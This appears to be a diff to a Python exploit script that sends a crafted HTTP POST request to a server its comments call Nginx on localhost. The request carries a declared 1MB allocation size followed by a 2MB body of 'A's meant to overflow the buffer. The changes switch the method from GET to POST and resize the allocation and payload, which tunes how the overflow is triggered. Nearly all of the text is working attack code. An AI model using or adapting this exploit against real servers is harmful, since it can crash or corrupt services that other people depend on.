@@ -4,16 +4,20 @@ import struct
 import time
 
 def create_exploit_packet():
-    # First 4 bytes: allocation size (4 bytes)
-    alloc_size = struct.pack("<I", 4)  # Request tiny allocation
+    # First 4 bytes: "POST" to trigger the vulnerability
+    http_method = b"POST"
     
-    # Create a massive payload (250MB of 'A's)
-    payload_size = 250 * 1024 * 1024  # 250MB
+    # Next 4 bytes: allocation size (1MB)
+    alloc_size = struct.pack("<I", 1024 * 1024)  # 1MB allocation
+    
+    # Create a payload that will be copied from offset 8
+    # Make it larger than the allocation to cause overflow
+    payload_size = 2 * 1024 * 1024  # 2MB
     payload = b'A' * payload_size
     
     # Create a valid HTTP request with our payload in the body
     http_request = (
-        b"GET / HTTP/1.1\r\n"  # Changed to GET since POST was getting rejected
+        b"POST / HTTP/1.1\r\n"
         b"Host: localhost\r\n"
         b"Content-Type: application/octet-stream\r\n"
         b"Content-Length: %d\r\n"
@@ -21,8 +25,9 @@ def create_exploit_packet():
         b"\r\n"
     ) % (len(alloc_size) + len(payload))
     
-    print(f"[*] Total payload size: {payload_size / (1024*1024):.2f} MB")
-    print(f"[*] Requested allocation size: 4 bytes")
+    print(f"[*] Allocation size: 1MB")
+    print(f"[*] Payload size: {payload_size / (1024*1024):.2f} MB")
+    print(f"[*] Data will be copied from offset 8")
     
     # Combine HTTP request with our payload
     return http_request + alloc_size + payload
@@ -30,7 +35,7 @@ def create_exploit_packet():
 def main():
     # Create socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(30)  # Increased timeout for large payload
+    s.settimeout(30)
     
     try:
         # Connect to Nginx
@@ -41,7 +46,7 @@ def main():
         print("[*] Creating exploit packet...")
         exploit = create_exploit_packet()
         
-        # Send the exploit in chunks to avoid memory issues
+        # Send the exploit in chunks
         print("[*] Sending exploit packet in chunks...")
         chunk_size = 1024 * 1024  # 1MB chunks
         sent = 0
